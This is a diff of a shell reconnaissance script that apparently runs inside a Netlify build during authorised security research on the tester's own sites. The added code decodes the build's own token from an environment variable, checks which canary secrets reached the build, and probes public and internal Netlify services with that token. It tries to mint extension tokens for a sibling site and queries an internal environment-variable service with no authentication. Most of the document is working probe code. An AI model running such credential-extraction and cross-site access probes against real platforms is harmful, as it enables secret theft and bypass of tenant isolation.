@@ -129,54 +129,94 @@ echo
 echo "=================== END RECON ==========================================="
 
 # ============================================================================
-# PART 2 -- what does THIS build's own credential buy?
-# The question the whole lane rests on: a build is denied sensitive env values,
-# but is it handed authority that can fetch them back?
+# PART 2 -- authority, not execution.
+# RCE here is the product. The question is what this build's own credential
+# reaches that the isolation promise says it cannot.
+# Sibling site ids are BOTH MINE, same account -- this measures enforcement
+# GRANULARITY (per-site vs per-account), which decides whether a cross-tenant
+# test is even worth setting up.
 # ============================================================================
-hr "B1  extract this build's own token from NETLIFY_BLOBS_CONTEXT"
-BT=$(printf %s "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
-if [ -z "$BT" ]; then echo "  no token in blobs context"; else
-  echo "  token len=${#BT} prefix=${BT:0:4} sha256=$(printf %s "$BT" | sha256sum | cut -c1-16)"
-fi
-
-hr "B2  does the build token work against the DOCUMENTED api? (api.netlify.com)"
-for p in /api/v1/user /api/v1/sites /api/v1/accounts "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
-  printf "  %-52s -> " "$p"
-  timeout 12 curl -sS -o /tmp/b.out -w '%{http_code} ' "https://api.netlify.com$p" -H "Authorization: Bearer $BT" 2>/dev/null || printf 'ERR '
-  head -c 220 /tmp/b.out 2>/dev/null | tr -d '\n'; echo
-done
-
-hr "B3  will JIGSAW mint an extension_token for this build's token?"
+SITE_A=c2283052-f0fc-40fe-b813-0d4527661baa   # incredible-cobbler-ff0c1a
+SITE_B=62b5ca3e-8f63-4281-b766-e5649e789df8   # cherry-lane2-beta
+SITE_C=94b96efc-4aa2-4eca-bf2b-ec151107fdc2   # cherry-lane2-alpha (no repo)
+case "$SITE_ID" in
+  "$SITE_A") SIBLING=$SITE_B ;;
+  *)         SIBLING=$SITE_A ;;
+esac
 JG=https://jigsaw.services-prod.nsvcs.net
-printf "  team/%s/.../meta/%s -> " "${ACCOUNT_ID:0:10}…" "${SITE_ID:0:10}…"
-timeout 12 curl -sk -o /tmp/j.out -w '%{http_code} ' "$JG/team/$ACCOUNT_ID/integrations/installations/meta/$SITE_ID" \
-  -H "Netlify-SDK-Build-Bot-Token: $BT" 2>/dev/null || printf 'ERR '
-python3 - </tmp/j.out <<'PY' 2>/dev/null || echo "(no token)"
+
+hr "B0  is this deploy TRUSTED or UNTRUSTED?"
+echo "  CONTEXT=$CONTEXT  PULL_REQUEST=${PULL_REQUEST:-unset}  REVIEW_ID=${REVIEW_ID:-unset}"
+echo "  BRANCH=$BRANCH  HEAD=${HEAD:-unset}  REPOSITORY_URL=${REPOSITORY_URL:-unset}"
+echo "  SITE_ID=$SITE_ID  ACCOUNT_ID=${ACCOUNT_ID:-unset}  SIBLING=$SIBLING"
+
+hr "B0b  canaries: which env values reached THIS build?"
+echo "  CHERRY_PLAIN  = ${CHERRY_PLAIN:-<absent>}"
+echo "  CHERRY_SECRET = ${CHERRY_SECRET:+<present>}${CHERRY_SECRET:-<absent>}"
+
+hr "B1  extract this build's own token"
+BT=$(printf %s "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null \
+     | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
+if [ -z "$BT" ]; then echo "  NETLIFY_BLOBS_CONTEXT carries no token"; else
+  echo "  len=${#BT} prefix=${BT:0:4} sha256=$(printf %s "$BT" | sha256sum | cut -c1-16)"; fi
+
+probe () { # host label path [auth header value]
+  printf "  %-50s -> " "$2"
+  timeout 12 curl -sk -o /tmp/p.out -w '%{http_code} ' "$1$3" ${4:+-H "Authorization: Bearer $4"} 2>/dev/null || printf 'ERR '
+  head -c 240 /tmp/p.out 2>/dev/null | tr -d '\n'; echo
+}
+
+hr "B2  build token vs api.netlify.com -- WHAT IS ITS SCOPE?"
+A=https://api.netlify.com
+probe $A "/user"                          "/api/v1/user"                      "$BT"
+probe $A "/sites          (all? or one?)" "/api/v1/sites"                     "$BT"
+probe $A "/sites/{THIS}"                  "/api/v1/sites/$SITE_ID"            "$BT"
+probe $A "/sites/{SIBLING}  <-- the test" "/api/v1/sites/$SIBLING"            "$BT"
+probe $A "/accounts/{acct}/env"           "/api/v1/accounts/$ACCOUNT_ID/env"  "$BT"
+
+hr "B3  will Jigsaw mint an extension_token for the build token?"
+timeout 12 curl -sk -o /tmp/j.out -w '  mint: %{http_code}\n' \
+  "$JG/team/$ACCOUNT_ID/integrations/installations/meta/$SITE_ID" \
+  -H "Netlify-SDK-Build-Bot-Token: $BT" 2>/dev/null || echo "  mint: ERR"
+python3 - </tmp/j.out <<'PY' 2>/dev/null || echo "  (unparsable)"
 import sys,json,base64
 try: d=json.load(sys.stdin)
-except Exception: print("  unparsable"); raise SystemExit
-for e in d if isinstance(d,list) else []:
+except Exception: raise SystemExit
+for e in (d if isinstance(d,list) else []):
     t=e.get("extension_token") or ""
-    if not t: print(f"  {e.get('slug')}: extension_token EMPTY"); continue
-    p=t.split(".")[1]; p+="="*(-len(p)%4)
-    c=json.loads(base64.urlsafe_b64decode(p))
-    print(f"  {e.get('slug')}: owner_id={c.get('owner_id')} actor={c.get('actor_type')}")
-    print(f"     scopes={c.get('authorized_scopes')}")
+    if not t: print(f"    {e.get('slug')}: extension_token EMPTY"); continue
+    p=t.split(".")[1]; p+="="*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+    print(f"    {e.get('slug')}: owner_id={c.get('owner_id')} scopes={c.get('authorized_scopes')}")
     open("/tmp/ET","w").write(t)
 PY
+echo "  ALSO: try minting for the SIBLING site id with this build's token"
+timeout 12 curl -sk -o /tmp/j2.out -w '  mint(sibling): %{http_code} ' \
+  "$JG/team/$ACCOUNT_ID/integrations/installations/meta/$SIBLING" \
+  -H "Netlify-SDK-Build-Bot-Token: $BT" 2>/dev/null; head -c 160 /tmp/j2.out | tr -d '\n'; echo
 
-hr "B4  with that extension token, can the build read the env it was denied?"
+hr "B4  extension_token vs the Jigsaw /api/v1 proxy -- ENFORCEMENT GRANULARITY"
 if [ -s /tmp/ET ]; then
   ET=$(cat /tmp/ET)
-  for p in /api/v1/user "/api/v1/accounts/$ACCOUNT_ID/env" "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
-    printf "  %-52s -> " "$p"
-    timeout 12 curl -sk -o /tmp/e.out -w '%{http_code} ' "$JG$p" -H "Authorization: Bearer $ET" 2>/dev/null || printf 'ERR '
-    head -c 300 /tmp/e.out 2>/dev/null | tr -d '\n'; echo
-  done
-else
-  echo "  no extension token minted -- skipped"
-fi
+  probe $JG "/api/v1/user"                   "/api/v1/user"                       "$ET"
+  probe $JG "/api/v1/sites"                  "/api/v1/sites"                      "$ET"
+  probe $JG "/api/v1/sites/{THIS}"           "/api/v1/sites/$SITE_ID"             "$ET"
+  probe $JG "/api/v1/sites/{SIBLING} <- key" "/api/v1/sites/$SIBLING"             "$ET"
+  probe $JG "/api/v1/accounts/{acct}/env"    "/api/v1/accounts/$ACCOUNT_ID/env"   "$ET"
+  probe $JG "/api/v1/accounts/{slug}/env"    "/api/v1/accounts/cherry-bisht/env"  "$ET"
+else echo "  no extension token -- skipped"; fi
 
-hr "B5  canary check: which env values were actually PASSED to this build?"
-echo "  CHERRY_PLAIN in env: $([ -n "$CHERRY_PLAIN" ] && echo "YES ($CHERRY_PLAIN)" || echo no)"
-echo "  CHERRY_SECRET in env: $([ -n "$CHERRY_SECRET" ] && echo YES || echo no)"
+hr "B5  ENVELOPE -- does the env-var service trust network position?"
+# envelope.services-prod.nsvcs.net -> 10.64.130.84 in PUBLIC dns, unreachable from
+# the internet. In scope, critical. If it answers here, reachability IS the finding:
+# read only THIS site's own variables, then stop.
+EV=https://envelope.services-prod.nsvcs.net
+echo "  dns: $(getent ahostsv4 envelope.services-prod.nsvcs.net 2>/dev/null | awk '{print $1}' | head -1)"
+for p in "/" "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID" "/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
+  printf "  %-50s -> " "unauth $p"
+  timeout 8 curl -sk -o /tmp/ev.out -w '%{http_code} ' "$EV$p" 2>/dev/null || printf 'TIMEOUT '
+  head -c 200 /tmp/ev.out 2>/dev/null | tr -d '\n'; echo
+done
+[ -n "$BT" ] && probe $EV "with build token: /accounts/{acct}/env" "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID" "$BT"
+
+echo
+echo "=================== END RECON ==========================================="
